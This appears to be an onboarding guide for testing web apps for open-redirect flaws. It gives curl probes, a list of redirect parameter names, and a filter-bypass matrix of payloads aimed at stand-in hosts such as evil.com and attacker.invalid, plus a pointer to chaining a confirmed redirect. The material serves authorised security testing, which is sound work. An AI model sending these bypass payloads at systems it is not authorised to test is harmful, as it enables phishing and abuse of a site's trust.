# Onboarding — the first 15 minutes on an open-redirect surface

## Minute 0-3 — read the contract

- `../SKILL.md` — the first probe is one external destination, `follow=False`
- the falsifier: `Location: <safe>` on every canary + bypass arm
- the class is CATALOGUE — the corpus is published knowledge, not local
  experience; a verbatim `Location:`-canary is the local confirm

## Minute 3-6 — map the param

```bash
python3 tools/web/redirect_probe.py --selftest         # prove the tool
curl -s "$BASE/" | grep -iE 'next|redirect|return|url='  # the names in the app
python3 tools/web/redirect_probe.py --url "$BASE/login" --param next
```

`param-inventory.md` is the vocabulary — `next`/`url`/`redirect`/`return`/
`returnTo`/`goto`/`callback`/`RelayState`/`dest`/`target`/`continue`/`to`/
`out`/`link`/`back`/`prev`/`post_logout_redirect_uri`.

## Minute 6-9 — the first canary

```bash
curl -si --max-time 10 \
  "$BASE/login?next=https%3A%2F%2Fattacker.invalid%2Flanding" \
  | grep -i '^location'
```

Read the ONE `Location:` — the fingerprint:
- `Location: https://attacker.invalid` → CANDIDATE → `evidence-rules.md`
- `Location: /` → forced-relative → the `/`-check → the `//`/`\`/`%5c` arms
- `Location: https://target.com/...` → a host-force → the `@`/substring arms
- no `Location` → weak-negative → a different param

## Minute 9-12 — the matching arms

```bash
# the fingerprint names the arms — the filter-bypass matrix
curl -si "$BASE/login?next=%2f%2fevil.com" | grep -i location    # //
curl -si "$BASE/login?next=%5c%5cevil.com" | grep -i location    # \\
curl -si "$BASE/login?next=https%3a%2f%2ftarget.com%40evil.com" | grep -i location  # @
curl -si "$BASE/login?next=https%3a%2f%2ftarget.com.evil.com" | grep -i location    # subdomain
```

## Minute 12-15 — the verdict

- a `Location: <canary>` → post-probe `confirms --evidence-kind class`
- every arm → `Location: <safe>` → the class falsifier → record the arms
- the param produces no Location → weak-negative → sweep the vocabulary
- a confirmed canary → `chain-routes.md` → the laundered-trust route

## The discipline reminders

- ONE param + ONE arm at a time — an attributable `Location:` per send
- the verbatim `Location:` is the evidence — `curl -si` + `grep -i location`
- don't follow the redirect (`-L`) — the header is the evidence
- record every arm's `Location:` — the arms-tried list is the falsifier's
  evidence
